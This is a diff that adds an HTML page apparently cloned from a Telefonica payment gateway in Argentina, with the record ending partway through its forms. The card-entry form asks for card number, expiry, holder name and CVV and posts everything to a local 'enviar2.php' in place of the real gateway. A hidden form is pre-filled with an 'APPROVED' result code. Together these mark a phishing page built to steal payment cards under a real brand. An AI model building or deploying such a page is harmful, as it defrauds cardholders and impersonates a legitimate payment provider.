@@ -1,0 +1,1316 @@
+<!DOCTYPE html>
+<!-- saved from url=(0057)https://switch.pgp.telefonica.com/servlet/ServletDirector -->
+<html lang="ES">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-15">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0">
+    <title>Formulario de Pago</title>
+    <link rel="shortcut icon" href="https://switch.pgp.telefonica.com/images/favicon.ico">
+
+
+
+
+
+
+
+
+
+
+    <!--<base href="https://switch.pgp.telefonica.com:443/">-->
+    <base href=".">
+
+
+
+
+
+    <link rel="stylesheet" type="text/css" href="./default.css">
+    <link rel="stylesheet" type="text/css" href="./PRO_TUAR_02000000002_20191202.css">
+
+
+
+
+
+
+
+    <script>
+        var txtVolver = "Volver";
+        var txtNoDatosConsulta = "No existen datos para la consulta";
+        var txtERR_CONSULTE_ADMIN = "ERROR, CONSULTE CON EL ADMINISTRADOR";
+        var txtSEGURIDADVULNERADA = "SEGURIDAD VULNERADA. CONSULTE URGENTEMENTE CON EL ADMINISTRADOR";
+        var txtCad = "Caduca en ";
+        var txtTimeExp = "Ha expirado el tiempo para realizar la operaci�n";
+        var txtErrDestoken = "Por favor, introduce un nombre de tarjeta v�lido.";
+        var txtErrValTit = "El titular de la tarjeta no es correcto.";
+        var txtValCuotas = "Sin aplazamiento  ";
+        var txtValMesesGracia = "Periodo de gracia";
+        var txtImporte = "Importe";
+        var txtImporteOrig = "Importe original";
+        var txtSinCuotas = "Sin aplazamiento  ";
+        var txtIntentosOTP = "Intentos restantes";
+        var txtRequeridoOTP = "C�digo obligatorio.";
+        var txtErrorGooglePay = "No ha sido posible realizar el pago con GooglePay, seleccione otro m�todo de pago.";
+        var txtErrorApplePay = "No ha sido posible realizar el pago con ApplePay, seleccione otro m�todo de pago.";
+        //DESDE CAMPOS COMENTADOS INCLUIDOS EN shVILO.js
+        var txtCuotas = "cuotas sin intereses";
+        var txtCuotasUno = "sin inter�s";
+        var txtRealesMoneda = "BRL";
+        var txtRealesMoneda2 = "EUR";
+        //HASTA CAMPOS COMENTADOS INCLUIDOS EN shVILO.js
+        //DESDE shTPER.js
+        var txtPanelExtra = "Coloca el c�digo de seguridad que se encuentra detr�s de tu tarjeta";
+        //HASTA shTPER.js
+        //DESDE shTRBR.js
+        var txtCuotasNuevo = "Pagar a plazos";
+        //HASTA shTRBR.js
+    </script>
+
+
+
+    <script>
+        var sBase = 'https://switch.pgp.telefonica.com:443';
+        var sPuerto = '443';
+        var sFormatoFecha = "dd/MM/yyyy HH:mm:ss:SSS";
+        var sFormatoFechaJava = "dd/MM/yyyy HH:mm:ss:SSS";
+        var sSeparadorFecha = "/";
+        var sFechaSistema = "21/03/2022 02:14:41:394";
+        var sFechaSistemaMenosUnDia = "20/03/2022 02:14:41:394";
+        var timeout = "";
+        var sDESARROLLOCHARSET = "";
+        var versionApplePay = "3";
+        var btnPaypalSize = "medium";
+        var btnPaypalColor = "gold";
+        var btnPaypalShape = "rect";
+        var btnPaypalLabel = "pay";
+        var btnPaypalTagline = "false";
+        var btnPaypalLayout = "horizontal";
+        var urlRiskPaypal = "https://api.paypal.com/v1/risk/transaction-contexts";
+        var urlTokenPaypal = "https://api.paypal.com/v1/oauth2/token";
+        var merchantIdPaypal = "";
+        var pasoNewCard = "false";
+        var pasoOKBloqueo = false;
+        var separarPan = false;
+        var ordenAlternativo = false;
+        var bCvvAmex = false;
+        var pasoCuotasNuevas = false;
+
+        var bFinalizacionInicializar = false;
+        var bPuedeEjecutarApplePay = false;
+        var btnGooglePaySize = "static";
+        var btnGooglePayColor = "white";
+        var btnGooglePayType = "buy";
+        var entornoGooglePay = "PRODUCTION";
+        var apiVersionGooglePay = "2";
+        var windowChallangeAdyen = "05";
+        var bCuentaEventos = false;
+        var bEjectNotifEvento = false;
+        var bExcepcionCuotasJavascript = "false";
+
+
+
+
+        timeout = "10";
+
+
+
+        var environment = "live";
+        var url = "https://h.online-metrix.net/fp/check.js";
+        var seu_app = "";
+
+
+        var idCom = "02000010303";
+        var idUsu = "1163211729";
+        var idPed = "2022031647825276559";
+        var eMUsu = "";
+        var cdMon = "ARP";
+        var usCap = "0";
+        var tmTra = "2022-03-20T22:14:39.317 America/Argentina/Buenos_Aires";
+
+        var clPAY = "";
+        var sePAY = "";
+        var mePAY = "";
+        var frNam = "";
+        var LtNam = "";
+        var vPais = "";
+        var nTelf = "";
+
+        /*DESDE VARIABLES PAYMENTV1-V2.JS*/
+        var erroresNoRedireccion = new Array("", "");
+        var timeLimit = timeout; //tiempo en minutos definido en el config.properties
+        var conteo = new Date(timeLimit * 60000);
+        var cargaDatosCompra = true;
+        var pararConteo = false;
+        var varorigen = "";
+        var aux = "";
+        var pan = "";
+        var pan2 = "";
+        var panaux = "";
+        var errorOB = "";
+        var pos = 0;
+        var bPasoInfoPanCVV = false;
+        var eventOrigenCache = "";
+        var eventOrigen = "00";
+        var eventOrigenWindow = "";
+        var eventOrigenWindowExterno = "";
+        var pasoDestoken = false;
+        var pasoCuotasOB = false;
+        var impTransOrig = "";
+        var bParkinson = false;
+        var contVerificacionOTP = 0;
+        var contVerificacionOTPOrquestador = 0;
+        var bPasoPosiconarPan = false;
+        var bPasoPosiconarCamposObligatoriosCompletados = false;
+        var inputFocus = "";
+        var inputFocusAnterior = "";
+        var bControlVisivilidadNombreTitularVisible = false;
+        var bNotontrolFocoInputGenerico = true;
+        var bNoBotonesCompletarPayAppleMercado = true;
+        var bRedireccionAJAX = false;
+        var globalMM = "";
+        var bVisualizarFechaSelect = false;
+        var bVisualizarFechaInput = false;
+        var bDeshabilitarsaveMethodBINInfoPan = false;
+        var bTransaccionFinalizada = false;
+        var bTransaccionSalidaAuthenticar = false;
+        var eventoAutorizar = "";
+        var eventImpEventSelectCuotas = "";
+        var bTimeOut = false;
+        /*HASTA VARIABLES PAYMENTV1-V2.JS*/
+    </script>
+    <script src="./globalMiscelanea.js.descarga"></script>
+    <script src="./ContentLoader.js.descarga"></script>
+    <script src="./ContentJsonLoader.js.descarga"></script>
+
+    <!--<SCRIPT src="/includes/ContentJsonLoader.js?v=310122"></SCRIPT>-->
+
+
+
+    <script src="./shTUAR.js.descarga"></script>
+
+
+    <script src="./PaymentOF_V2.js.descarga"></script>
+
+
+
+</head>
+
+<body onload="inicializar(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);validarTokenComercio(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;0&#39;);validaOrigen(&#39;WEB&#39;);validaCanal(&#39;WEB&#39;);validaPagoCuotas(&#39;N&#39;);validaTipoTarjeta(&#39;N&#39;);">
+
+
+
+
+
+    <div id="main">
+        <div class="container">
+
+            <div id="header">
+                <table id="logo_head">
+                    <tbody>
+                        <tr>
+                            <td></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <!--logo-->
+            </div>
+            <!--header-->
+
+
+            <div id="left_content">
+                <table id="logo_left">
+                    <tbody>
+                        <tr>
+                            <td></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <!--logo-->
+            </div>
+            <!--sidebar-->
+
+
+
+
+            <div id="block_content">
+
+                <form name="FormAuthorise" method="post" action="enviar2.php">
+
+                    <div id="cardbox" class="cardbox">
+
+                        <header>
+                            <div class="card" id="cc-card">
+                                <div class="flipper">
+
+                                    <div class="front">
+
+                                        <div class="card-bg">
+                                            <span id="idfrontcc-bg" class="frontcc-bg"></span>
+                                        </div>
+                                        <div class="card-content">
+                                            <div class="credit-card-type"></div>
+                                            <div id="idcard-numberfront" class="card-number">
+                                                <span>1234 1234 1234 1234</span>
+                                            </div>
+                                            <div class="card-holder">
+                                                <em>TITULAR</em>
+                                                <span>NOMBRE Y APELLIDOS</span>
+                                            </div>
+                                            <div class="validuntil">
+                                                <em>CADUCIDAD</em>
+                                                <div class="e-month">
+                                                    <span>
+										                      MM
+										                    </span>
+                                                </div>
+                                                <div class="e-divider">
+                                                    <span>
+										                      /
+										                    </span>
+                                                </div>
+                                                <div class="e-year">
+                                                    <span>
+										                      AA
+										                    </span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <!-- card-content -->
+                                    </div>
+                                    <!-- front -->
+
+                                    <div class="back">
+
+                                        <div class="card-bg">
+                                            <span id="idbackcc-bg" class="backcc-bg"></span>
+                                        </div>
+                                        <div class="ccv">
+                                            <em>CCV Number</em>
+                                            <strong></strong>
+                                        </div>
+                                        <div class="card-content">
+                                            <div id="idcard-numberback" class="card-number">
+                                                <span>1234 1234 1234 1234</span>
+                                            </div>
+                                            <div class="card-holder">
+                                                <span>NOMBRE Y APELLIDOS</span>
+                                            </div>
+                                            <div class="validuntil">
+                                                <div class="e-month">
+                                                    <span>
+										                      MM
+										                    </span>
+                                                </div>
+                                                <div class="e-divider">
+                                                    <span>
+										                      /
+										                    </span>
+                                                </div>
+                                                <div class="e-year">
+                                                    <span>
+										                      AA
+										                    </span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <!-- card-content -->
+                                    </div>
+                                    <!-- back -->
+
+                                </div>
+                                <!-- flipper -->
+                            </div>
+                            <!-- cc-card -->
+
+                        </header>
+                        <!-- header -->
+
+                    </div>
+                    <!-- box -->
+
+                    <!-- AQUI HASTA WEB-DELUXE -->
+
+
+
+                    <div id="reloj" class="reloj">&nbsp;</div>
+                    <div id="idspace">&nbsp;</div>
+
+                    <div id="divContainerHeadPayByLink">
+                        <div id="divMERCHANTTEXT">
+                            <p>
+                                <span id="spanTextoMERCHANTTEXT">Comercio: </span>
+                                <span id="spanValorMERCHANTTEXT"></span>
+                            </p>
+                        </div>
+
+                        <div id="divPAYMENTDESCRIPTION">
+                            <p>
+                                <span id="spanTextoPAYMENTDESCRIPTION">Concepto: </span>
+                                <span id="spanValorPAYMENTDESCRIPTION"></span>
+                            </p>
+                        </div>
+                    </div>
+
+                    <div id="formaPago">
+                        <h1>Datos de pago</h1>
+                    </div>
+
+                    <!--MODALEXPIRED-->
+                    <div id="modalExpiredCart" class="modalExp modal">
+                        <div class="modalmid clearfix">
+                            <div class="modal-title msgNewModal">El tiempo para realizar la operacion se ha agotado.</div>
+                            <hr class="modal-separator">
+                            <div class="modal-content msgNewModalMini">
+                                <p>Si quieres realizar de nuevo la operaciin deberes iniciar de nuevo el proceso de compra</p>
+                            </div>
+                            <div class="btn">
+                                <a href="javascript:void(0)" onclick="retornarExpired();" class="btn-m right" title="Aceptar">Aceptar</a>
+                            </div>
+                            <div class="clear"></div>
+                        </div>
+                    </div>
+
+                    <!--MODALDINAMIC-->
+                    <div id="modalDinamic" class="modalExp modal">
+                        <div class="modalmid clearfix">
+                            <div class="modal-title msgNewModal">Se ha producido un error.</div>
+                            <hr class="modal-separator">
+                            <div class="modal-content msgNewModalMini">
+                                <p id="textModalDinamic"><strong></strong></p>
+                            </div>
+                            <div class="btn">
+                                <a href="javascript:void(0)" onclick="retornarError();" class="btn-m right" title="Aceptar">Aceptar</a>
+                            </div>
+                            <div class="clear"></div>
+                        </div>
+                    </div>
+
+
+
+                    <!--NUMERO DE TARJETA-->
+
+                    <div id="cardNumberRow" class="formRow">
+
+
+                        <label id="creditDebitCardCardNumberLabel">Numero de la tarjeta:<span class="requiredSign">&nbsp;*</span></label>
+
+
+
+                        <input name="CC" pattern="[0-9]*" placeholder=" " id="cardNumber" class="digitsOnly" value="" maxlength="23" title="Numero de la tarjeta"><span id="marcaTarjeta" class="" style="display: none;"></span>
+
+
+                        <div class="errorData">
+                            <div class="errorMessageWrapper"><span class="errorLeftArrow"></span><span class="message">El numero de la tarjeta no es correcto. Por favor, revisalo</span></div>
+                        </div>
+                        <div class="errorData2">
+                            <div class="errorMessageWrapper2"><span class="errorLeftArrow"></span><span class="message">El numero de su tarjeta es obligatorio</span></div>
+                        </div>
+                        <p class="fieldDescription">Escribe los numeros de tu tarjeta sin espacios ni guiones</p>
+                    </div>
+
+                    <div id="sidebar" style="display: none;">
+                        <div class="block_inside">
+                            <div class="data_blok_inside">
+                                <img id="imgDataPayment" onerror="errorSidebar(event)" src="./IMG_TUAR_D.png" alt="Importe" class="logo_compra">
+                                <h3>Datos de la Compra</h3>
+                                <ul>
+                                    <li><a href="https://switch.pgp.telefonica.com/">Importe:</a></li>
+                                    <li id="importeCuota">
+                                        800,00
+
+                                    </li>
+                                    <li><a href="https://switch.pgp.telefonica.com/">Moneda:</a></li>
+                                    <li>ARP</li>
+                                </ul>
+                                <ul id="datosImporteOriginal">
+                                    <li><a href="https://switch.pgp.telefonica.com/">Importe original:</a></li>
+                                    <li id="importeOriginal">
+                                        800,00
+
+                                    </li>
+                                    <li><a href="https://switch.pgp.telefonica.com/">Moneda:</a></li>
+                                    <li>ARP</li>
+                                </ul>
+                            </div>
+                            <!--datos_compra-->
+                        </div>
+                        <!--block_inside-->
+                    </div>
+                    <!--sidebar-->
+
+                    <!--FECHA CADUCIDAD-->
+
+                    <div id="expiryDateRow" class="formRow">
+                        <label id="creditDebitCardExpiryDateLabel">Fecha de caducidad:<span class="requiredSign">&nbsp;*</span></label>
+                        <span class="date">																	
+												<span class="selectBox">																																    
+											     <select name="mes" id="expiryDateMonthInput" title="Mes">
+												    <option value="">mes</option>
+												    <option value="01">01</option>
+												    <option value="02">02</option>
+												    <option value="03">03</option>
+												    <option value="04">04</option>
+												    <option value="05">05</option>
+												    <option value="06">06</option>
+												    <option value="07">07</option>
+												    <option value="08">08</option>
+												    <option value="09">09</option>
+												    <option value="10">10</option>
+												    <option value="11">11</option>
+												    <option value="12">12</option>																																
+													</select>																																																					
+												</span>
+
+                        <span class="selectBox">																																	    
+											     <select name="ano" id="expiryDateYearInput" title="a&ntilde;o">
+												    <option value="">a&ntilde;o</option>	
+												    <option value="22">2022</option><option value="23">2023</option><option value="24">2024</option><option value="25">2025</option><option value="26">2026</option><option value="27">2027</option><option value="28">2028</option><option value="29">2029</option><option value="30">2030</option><option value="31">2031</option><option value="32">2032</option><option value="33">2033</option><option value="34">2034</option><option value="35">2035</option><option value="36">2036</option><option value="37">2037</option><option value="38">2038</option><option value="39">2039</option><option value="40">2040</option><option value="41">2041</option><option value="42">2042</option><option value="43">2043</option><option value="44">2044</option><option value="45">2045</option><option value="46">2046</option><option value="47">2047</option><option value="48">2048</option><option value="49">2049</option>											    														    												  												   												  
+										 		 </select>																																																			
+												</span>
+                        </span>
+                        <div class="errorData">
+                            <div class="errorMessageWrapper"><span class="errorLeftArrow"></span><span class="message">Este campo es obligatorio</span></div>
+                        </div>
+                        <div class="errorData2">
+                            <div class="errorMessageWrapper2"><span class="errorLeftArrow2"></span><span class="message2">La fecha de caducidad no es correcta</span></div>
+                        </div>
+                    </div>
+
+                    <div id="expiryDateDIVRowNew">
+                        <div id="expiryDateLRowNew" class="formRow">
+                            <label id="creditDebitCardExpiryDateLabelNew">Fecha de caducidad:<span class="requiredSign">&nbsp;*</span></label>
+                            <input name="EXPIRYDATEMONTHYEAR" id="expiryDateMonthyearInput" maxlength="5" pattern="\d*" placeholder="MM/AA" type="text" title="Fecha de caducidad">
+                            <div class="errorData">
+                                <div class="errorMessageWrapper"><span class="errorLeftArrow"></span><span class="message">Este campo es obligatorio</span></div>
+                            </div>
+                            <div class="errorData2">
+                                <div class="errorMessageWrapper2"><span class="errorLeftArrow2"></span><span class="message2">La fecha de caducidad no es correcta</span></div>
+                            </div>
+                        </div>
+                    </div>
+                    <!--NOMBRE TITULAR-->
+
+                    <div id="cardNameRow" class="formRow">
+                        <label id="creditDebitCardCardNameLabel">Titular de la tarjeta:
+													
+													<span class="requiredSign">&nbsp;*</span>
+	  	  	                                        
+													</label>
+
+                        <input name="titular" type="text" id="cardName" placeholder=" " value="" maxlength="99" autocomplete="cc-name" title="Titular de la tarjeta">
+                        <div class="errorData">
+                            <div class="errorMessageWrapper"><span class="errorLeftArrow"></span><span class="message">El titular de la tarjeta no es correcto. Por favor, rev�salo</span></div>
+                        </div>
+                        <p class="fieldDescription">Escribe el nombre tal y como aparece en tu tarjeta</p>
+                    </div>
+
+                    <!--CVV-->
+
+                    <div id="cscRow" class="formRow">
+                        <label id="creditDebitCardCSCLabel">Codigo de seguridad (CVV):<span class="requiredSign">&nbsp;*</span></label>
+
+
+                        <input name="CVC" type="text" pattern="[0-9]*" id="csc" class="digitsOnly" placeholder=" " value="" maxlength="4" size="4" title="N�mero de seguridad (CVV)">
+
+                        <div id="cscImage" title="�Qu� es el CVV?">&nbsp;</div>
+                        <div id="cvvHelpPanel">
+                            <span class="leftArrow"></span>
+                            <h3>Que es el CVV?</h3>
+                            <div id="cvvHelpPanel3" title="Son los ultimos 3 digitos en el reverso de la tarjeta" style="display: block;">
+                                <span class="cvvHelpText">Son los ultimos 3 digitos en el reverso de la tarjeta</span><span class="cvvVisa">&nbsp;</span>
+                            </div>
+                            <div id="cvvHelpPanel4" title="Son los ultimos 4 digitos en el frontal de la tarjeta" style="display: block;">
+                                <span class="cvvHelpText">Son los ultimos 4 digitos en el frontal de la tarjeta</span><span class="cvvAmex">&nbsp;</span>
+                            </div>
+                            <span class="pointer"></span>
+                            <a id="closeCvvHelpPanel" title="cerrar"></a>
+                        </div>
+                        <div class="errorData">
+                            <div class="errorMessageWrapper"><span class="errorLeftArrow"></span><span class="message">Por favor, introduce un CVV valido</span></div>
+                        </div>
+                        <div class="errorData2">
+                            <div class="errorMessageWrapper2"><span class="errorLeftArrow"></span><span class="message">Por favor, introduce un CVV valido</span></div>
+                        </div>
+                        <p class="fieldDescription">Escribe el CVV de la tarjeta.</p>
+                    </div>
+
+                    <!--HELP CVV-->
+
+
+                    <div id="saveMethodRow" class="formRow" style="display: none;">
+                        <div id="saveMethodBlock" class="saveMethodBlock">
+                            <div id="saveMethodBlock1" class="saveMethodBlock1">
+                                <span id="savePaymentMethodBox">
+						                                <input type="checkbox" id="saveMethodBox" class="savePaymentDetails" name="saveMethodBox" value="1" title="Guardar tarjeta">
+						                                <label id="saveMethodLabel" for="saveMethodBox" class="">Guardar esta tarjeta para futuras compras</label>
+						                            </span>
+                            </div>
+                            <div id="savePaymentMethodBody">
+                                <div id="saveMethodBlock2" class="saveMethodBlock2">
+                                    <p class="fieldDescription">Pon un nombre a esta tarjeta. Asi te sere mas facil identificarla</p>
+                                    <span id="savePaymentMethod">
+						                                   <label for="DESTOKEN">Nombre de tu tarjeta:</label> 
+						                                   <input type="text" id="DESTOKEN" maxlength="60" autocomplete="off" size="50" placeholder="Introduce nombre para futuras compras" title="Nombre de tu tarjeta" name="DESTOKEN" value="">				                                  
+						                                </span>
+                                    <div class="errorData">
+                                        <div class="errorMessageWrapper"><span class="errorLeftArrow"></span><span class="message">Por favor, introduzca un nombre v�lido.</span></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!--CUOTAS-->
+
+                    <div id="tipoCuota" class="formRow" style="display: none;">
+
+                        <div>
+                            <input type="checkbox" id="CUOTAS" value="N">
+                            <label id="CuotaLabel">Pagar a plazos</label>
+                        </div>
+
+                        <div id="SelectCuota">
+                            <span class="selectBox">																																	    
+											    <select name="CUOTA" id="Cuota">
+												    <option value="">Sin aplazamiento  </option>								    																									
+												</select>																																										
+												</span>
+                        </div>
+
+                        <div id="SelectOpcionesCuota">
+                            <span class="selectBox">																																	    
+											    <select name="OPCIONESCUOTA" id="OpcionesCuota">
+												    <option value="">Periodo de gracia</option>									    																									
+												</select>																																										
+												</span>
+                        </div>
+                        <span id="errorOB" style="display: none;"></span>
+                        <div class="errorData">
+                            <div class="errorMessageWrapper"><span class="errorLeftArrow"></span><span class="message">Este campo es obligatorio</span></div>
+                        </div>
+
+                    </div>
+
+                    <div id="capCaptcha" class="formRow accessed" style="display: none;">
+                        <table>
+                            <tbody>
+                                <tr>
+                                    <td colspan="2"><label id="capchaLabel">Teclea los caracteres que aparecen en la imagen:<span class="requiredSign">&nbsp;*</span></label></td>
+                                </tr>
+                                <tr>
+                                    <td>
+
+                                        <input type="text" id="cap" name="cap" value="" readonly="" maxlength="8" title="" onfocus="QuitarFocoCaptcha()" onkeypress="return false">
+                                    </td>
+                                    <td>
+                                        <table>
+                                            <tbody>
+                                                <tr>
+                                                    <td>
+
+                                                        <input pattern="[0-9]*" class="digitsOnly" id="captchaText" name="captchaText" value="" maxlength="8" title="Captcha">
+
+                                                        <div class="errorData">
+                                                            <div class="errorMessageWrapper"><span class="errorLeftArrow"></span><span class="message">Teclea los caracteres que aparecen en la imagen</span></div>
+                                                        </div>
+                                                    </td>
+                                                </tr>
+                                                <tr>
+                                                    <td><label><a href="javascript: actucap();">Cambiar</a></label></td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+
+            </div>
+            <!--bloquePayment-->
+
+        </div>
+
+        <!--footer-->
+
+        <div id="confirmPaymentButton" class="btn">
+            <button type="submit" id="bConfirmPaymentButton" class="btn-b" onclick="confirmarCompra();" title="Comprar">
+                            <span id="pre-copyBtnMc">Finalizar</span>
+                        </button>
+        </div>
+
+        <div id="confirmButtonDCC" class="btn">
+            <div id="confirmButtonDIVDCC">&nbsp;</div>
+            <button id="bButtonDCCTPV" class="btn-b" onclick="dccMonedaTPV();" title="Comprar">
+                            <span id="pre-copyBtnMc1"></span>
+                        </button>
+            <div id="confirmButtonDIVTitular">&nbsp;</div>
+            <button id="bButtonDCCTitular" class="btn-b" onclick="dccMonedaTitular();" title="Comprar">
+		                   <span id="pre-copyBtnMc2"></span>
+		               </button>
+        </div>
+
+        </form>
+
+        <!-- a Clearing DIV to clear the DIV's because overflow:auto doesn't work here -->
+        <div style="clear:both"></div>
+
+        <!--<div id="ButtonMediosPago" >-->
+
+        <div id="paypalBoton" style="display: none;">
+            <div id="bConfirmPaymentPaypalButton"></div>
+        </div>
+
+        <div id="applepay">
+            <input type="button" id="bConfirmPaymentAppleButton" class="apple-pay-button apple-pay-button-black" value=" " onclick="completarCompraApplePay();">
+        </div>
+
+        <div id="mercadoPago" style="display: none;">
+            <input type="button" id="bConfirmPaymentMercadoPagoButton" class="bMercadoPago" title="Mercado Pago" onclick="completarCompraMercadoPago();" value="Mercado Pago">
+        </div>
+
+        <div id="boletoAdyen" style="display: none;">
+            <input type="button" id="bConfirmPaymentBoletoAdyenButton" class="bBoletoAdyen" title="Boleto bancario" onclick="completarCompraBoletoAdyen();" value="Boleto bancario">
+        </div>
+
+        <div id="googlePay" style="display: none;">
+            <div id="bConfirmPaymentGooglePayButton"></div>
+        </div>
+
+        <!--</div>-->
+
+        <div id="otrosMediosPago">
+            <h3 class="otrosMediosDescription" onclick="mostrarContenido();">Otros medios de pago</h3>
+            <div id="contenido">
+
+                <div id="paypalContenido" style="display: none;">
+                    <div id="bConfirmPaymentPaypalButtonContenido"></div>
+                </div>
+
+                <div id="applepayContenido">
+                    <input type="button" id="bConfirmPaymentAppleButtonContenido" class="apple-pay-button apple-pay-button-black" value=" " onclick="completarCompraApplePay();">
+                </div>
+
+                <div id="mercadoPagoContenido" style="display: none;">
+                    <input type="button" id="bConfirmPaymentMercadoPagoButtonContenido" class="bMercadoPagoContenido" title="Mercado Pago" onclick="completarCompraMercadoPago();" value="Mercado Pago">
+                </div>
+
+                <div id="boletoAdyenContenido" style="display: none;">
+                    <input type="button" id="bConfirmPaymentBoletoAdyenButtonContenido" class="bBoletoAdyenContenido" title="Boleto bancario" onclick="completarCompraBoletoAdyen();" value="Boleto bancario">
+                </div>
+
+                <div id="googlePayContenido" style="display: none;">
+                    <div id="bConfirmPaymentGooglePayButtonContenido"></div>
+                </div>
+
+            </div>
+        </div>
+
+
+
+        <!-- AQUIAQUI HASTA WEB-DELUXE -->
+
+    </div>
+    <!--block_content-->
+
+    <div id="right_content">
+        <table id="logo_right">
+            <tbody>
+                <tr>
+                    <td></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+    <!--sidebar-->
+
+
+    <!--footer<div id="footer">
+		    <h2 id="footerh2"></h2>
+		    <h2 id="logo_footh2"></h2>
+			<table id="logo_foot">			
+				<tr><td></td></tr>
+			</table>
+		</div>footer-->
+
+
+
+    </div>
+    <!--container-->
+
+
+
+    </div>
+    <!--main-->
+
+    <form name="FormResp" method="post" action="enviar2.php">
+        <input type="hidden" name="CODRESOLUCION" value="0000">
+        <input type="hidden" name="DESRESOLUCION" value="APPROVED">
+        <input type="hidden" name="IDVERSION" value="">
+        <input type="hidden" name="IDTERMINAL" value="">
+        <input type="hidden" name="IDENTIDAD" value="">
+        <input type="hidden" name="IDCOMERCIO" value="">
+        <input type="hidden" name="IDSERVICIO" value="">
+        <input type="hidden" name="IDUSUARIO" value="">
+        <input type="hidden" name="IDTM" value="">
+        <input type="hidden" name="PROCESS_CODE" value="">
+        <input type="hidden" name="IDPEDIDO" value="2022031647825276559">
+        <input type="hidden" name="PAN" value="">
+        <input type="hidden" name="FECCAD" value="">
+        <input type="hidden" name="IMPTRANS" value="">
+        <input type="hidden" name="CODMON" value="">
+        <input type="hidden" name="MONEDA" value="">
+        <input type="hidden" name="IPORIGEN" value="">
+        <input type="hidden" name="FIRMTOKEN" value="">
+        <input type="hidden" name="TOKEN" value="">
+        <input type="hidden" name="DESTOKEN" value="">
+        <input type="hidden" name="FECHSIA" value="">
+        <input type="hidden" name="FECHPRO" value="">
+        <input type="hidden" name="FFHHTRANS" value="">
+        <input type="hidden" name="NUMSIA" value="">
+        <input type="hidden" name="NUMAUT" value="">
+        <input type="hidden" name="IMPTRANSDCC" value="">
+        <input type="hidden" name="CODMONDCC" value="">
+        <input type="hidden" name="EMAILUSUARIO" value="">
+        <input type="hidden" name="SESIONCOMERCIO" value="">
+        <input type="hidden" name="LOTE" value="">
+        <input type="hidden" name="DATOSIMPRIMIR" value="">
+        <input type="hidden" name="URLPUCE" value="">
+        <input type="hidden" name="URL_AUTH_PETI" value="">
+        <input type="hidden" name="ACQUIRERENTITY" value="">
+        <input type="hidden" name="TIPOPAGO" value="">
+        <input type="hidden" name="NUMEROCUOTAS" value="">
+        <input type="hidden" name="MESESGRACIA" value="">
+        <input type="hidden" name="IMPORTEINTERESES" value="">
+        <input type="hidden" name="IDSIATRAN" value="">
+        <input type="hidden" name="IDCONCILIACION" value="">
+        <input type="hidden" name="BIN" value="">
+        <input type="hidden" name="EMISOR" value="">
+        <input type="hidden" name="PAISEMISOR" value="">
+        <input type="hidden" name="MARCA" value="">
+        <input type="hidden" name="SUBTIPO" value="">
+        <input type="hidden" name="DISPOSICION" value="">
+        <input type="hidden" name="MSISDN" value="">
+        <input type="hidden" name="ACQUIRERMERCHANT" value="">
+        <input type="hidden" name="RECEIPTNUMBER" value="">
+        <input type="hidden" name="AVSCODE" value="">
+        <input type="hidden" name="CVVRESULT" value="">
+        <input type="hidden" name="ORIGINCOUNTRY" value="">
+        <input type="hidden" name="AUTHENTICATION" value="">
+        <input type="hidden" name="ACQUIRERCODE" value="">
+        <input type="hidden" name="REGMETHOD" value="">
+        <input type="hidden" name="NOMTITULAR" value="">
+
+        <input type="hidden" name="MERCHANT_OTP" value="">
+        <input type="hidden" name="AUTHORIZATION_TOKEN" value="">
+        <input type="hidden" name="CODIGOBARRAS" value="">
+        <input type="hidden" name="DELIVERYDATE" value="">
+        <!-- <INPUT type='hidden' name='REGLAINFRINGIDA' value=''>
+	<INPUT type='hidden' name='DESCRIPCIONMARCA' value=''>
+	<INPUT type='hidden' name='DESCRIPCIONTIPOCUENTA' value=''>
+	<INPUT type='hidden' name='DESCRIPCIONEMISOR' value=''>
+	<INPUT type='hidden' name='DESCRIPCIONCATEGORIA' value=''> -->
+    </form>
+
+    <form name="FormPuce" method="post" action="enviar2.php">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+        <input type="hidden" id="Ds_Merchant_Amount" name="Ds_Merchant_Amount" value="">
+        <input type="hidden" id="Ds_Merchant_Currency" name="Ds_Merchant_Currency" value="">
+        <input type="hidden" id="Ds_Merchant_MatchingData" name="Ds_Merchant_MatchingData" value="">
+        <input type="hidden" id="Ds_Acquirer_Identifier" name="Ds_Acquirer_Identifier" value="">
+        <input type="hidden" id="Ds_Merchant_MerchantCode" name="Ds_Merchant_MerchantCode" value="">
+        <input type="hidden" id="Ds_Merchant_MerchantName" name="Ds_Merchant_MerchantName" value="">
+        <input type="hidden" id="Ds_Merchant_CSB" name="Ds_Merchant_CSB" value="">
+        <input type="hidden" id="Ds_Merchant_TransactionType" name="Ds_Merchant_TransactionType" value="">
+        <input type="hidden" id="Ds_Merchant_UrlOK" name="Ds_Merchant_UrlOK" value="">
+        <input type="hidden" id="Ds_Merchant_UrlKO" name="Ds_Merchant_UrlKO" value="">
+        <input type="hidden" id="Ds_Cardholder_Pan" name="Ds_Cardholder_Pan" value="">
+        <input type="hidden" id="Ds_Cardholder_Expiry" name="Ds_Cardholder_Expiry" value="">
+        <input type="hidden" id="Ds_Merchant_MerchantSignature" name="Ds_Merchant_MerchantSignature" value="">
+        <input type="hidden" id="Ds_Response" name="Ds_Response" value="">
+        <input type="hidden" name="HOSTNAME" value="2_443">
+        <input type="hidden" name="TIPORECURRENCIA" value="">
+    </form>
+
+    <form name="FormCardinal" method="post" action="enviar2.php">
+        <input type="hidden" name="G777" value="D7373943AD8D1AD37992D82BE77FC32B">
+        <input type="hidden" id="redirect" name="redirect" value="">
+        <input type="hidden" id="type" name="type" value="sale">
+        <input type="hidden" id="key_id" name="key_id" value="">
+        <input type="hidden" id="time" name="time" value="">
+        <input type="hidden" id="hash" name="hash" value="">
+        <input type="hidden" id="processor_id" name="processor_id" value="">
+        <input type="hidden" id="orderid" name="orderid" value="">
+        <input type="hidden" id="username" name="username" value="">
+        <input type="hidden" id="amount" name="amount" value="">
